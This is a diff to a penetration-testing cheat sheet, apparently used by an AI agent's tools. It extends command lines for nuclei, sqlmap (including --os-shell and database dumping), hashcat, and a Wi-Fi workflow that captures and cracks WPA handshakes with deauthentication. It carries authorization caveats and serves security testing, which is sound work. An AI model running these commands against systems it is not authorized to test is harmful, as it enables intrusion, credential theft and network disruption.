@@ -204,6 +204,9 @@ Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest, the
   nuclei -l live.txt                             # a list from httpx
   nuclei -u URL -tags wordpress,cve -severity critical,high
   nuclei -u URL -t /path/to/templates            # custom template dir
+More (verified flags): -as automatic scan (wappalyzer tech -> template tags), -c 25
+concurrency, -rl 150 rate-limit, -jsonl -o out.jsonl structured output, -nt run only
+newly-added templates, -as for an unknown stack, -ai '<prompt>' to generate a template.
 WordPress CVE coverage without a WPScan token: clone topscoder/nuclei-wordfence-cve
 and point at it: nuclei -u URL -t /path/to/nuclei-wordfence-cve (or set
 SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES so the `nuclei` seat tool includes it). Templates
@@ -232,8 +235,10 @@ Install: apt install sqlmap. Core:
   sqlmap -u '...' --batch --dbs                          # list databases
   sqlmap -u '...' -D dbname --tables                     # then --dump
   sqlmap -r request.txt --batch                          # from a saved Burp request
---batch = no prompts, --level/--risk raise depth (and noise), --dump extracts.
-Only against parameters you are authorized to test.
+--batch = no prompts, --level 1-5 / --risk 1-3 raise depth (and noise), -p PARAM to
+target one parameter, --technique BEUSTQ to pick techniques, --forms --crawl=2 to find
+and test forms, --random-agent, --os-shell for a shell (very intrusive). --dump extracts;
+--dump-format CSV/HTML. Only against parameters you are authorized to test.
 
 ## hydra — online credential testing (loud; can lock accounts)
 Install: apt install hydra. Core:
@@ -251,7 +256,9 @@ Install: apt install hashcat. Core:
   hashcat -m MODE hashes.txt -a 3 '?d?d?d?d?d?d?d?d'   # mask/brute
 Modes: 22000 = WPA-PBKDF2-PMKID+EAPOL (wifi), 0 = MD5, 100 = SHA1, 1000 = NTLM,
 1800 = sha512crypt, 3200 = bcrypt. -a 0 dictionary, -a 3 mask. Wordlist:
-/usr/share/wordlists/rockyou.txt. `hashcat --show hashes.txt` prints cracked ones.
+/usr/share/wordlists/rockyou.txt. -r rules/best64.rule mutates words, -a 0 dictionary /
+-a 3 mask, --username if the file is user:hash, --show prints cracked (from the potfile),
+--left prints still-uncracked. `hashcat -m MODE --show hashes.txt` after a run.
 
 ## metasploit — exploitation framework
 Install: apt install metasploit-framework. Non-interactive (what the `msf` tool does):
@@ -267,17 +274,20 @@ hcxdumptool README: hcxdumptool -> hcxpcapngtool -> hashcat. The capture tool an
 the converter versions MUST match, and the Wi-Fi adapter must support monitor mode
 AND frame injection (many built-in Intel/Broadcom chips do not; use a known-good
 external adapter, e.g. an Atheros/Ralink/MediaTek that supports it).
-1. Monitor mode:
-     sudo ip link set wlan0 down; sudo iw dev wlan0 set type monitor; sudo ip link set wlan0 up
-   (or: airmon-ng start wlan0  ->  wlan0mon)
-2. Capture (PMKID + EAPOL). Modern hcxdumptool 6.3.x:
-     sudo hcxdumptool -i wlan0 -w capture.pcapng -F
-   Older 6.2.x used --enable_status and --filterlist_ap/--filtermode to target one
-   BSSID — flags DRIFT between versions, so check `hcxdumptool --help` on the box.
-   Alternative with the aircrack suite (targets one AP + channel):
+1. hcxdumptool path (>= 6.3 / 7.x) — it sets monitor mode ITSELF, so pass the
+   PHYSICAL interface (wlan0, not wlan0mon) and do NOT run airmon-ng first:
+     sudo hcxdumptool -i wlan0 -w capture.pcapng -F         # -F = all frequencies
+     sudo hcxdumptool -i wlan0 -w capture.pcapng -c 11a     # one channel (band letter: a=2.4,b=5,c=6GHz)
+   Target ONE AP by compiling a BPF on its BSSID (the removed --filterlist_ap):
+     hcxdumptool --bpfc="wlan addr3 112233445566" > t.bpf   # BSSID, no colons
+     sudo hcxdumptool -i wlan0 -w capture.pcapng -F --bpf=t.bpf
+   Optional: --exitoneapol=1 stops on the first EAPOL. Check `hcxdumptool -h` — flags
+   DRIFT between versions (6.2 -> 6.3 -> 7.x removed/renamed several).
+2. aircrack path (alternative; here you DO set monitor mode):
+     sudo airmon-ng start wlan0            # -> wlan0mon
      sudo airodump-ng -c CHANNEL --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
    PMKID needs no client; a 4-way handshake needs a client to (re)associate —
-   aireplay-ng -0 (deauth) forces it, only on your own AP.
+   aireplay-ng -0 1 -a BSSID wlan0mon (deauth) forces it, only on your own AP.
 3. Convert to a hashcat-crackable hash (hcxtools):
      hcxpcapngtool -o hash.22000 capture.pcapng
 4. Crack offline:
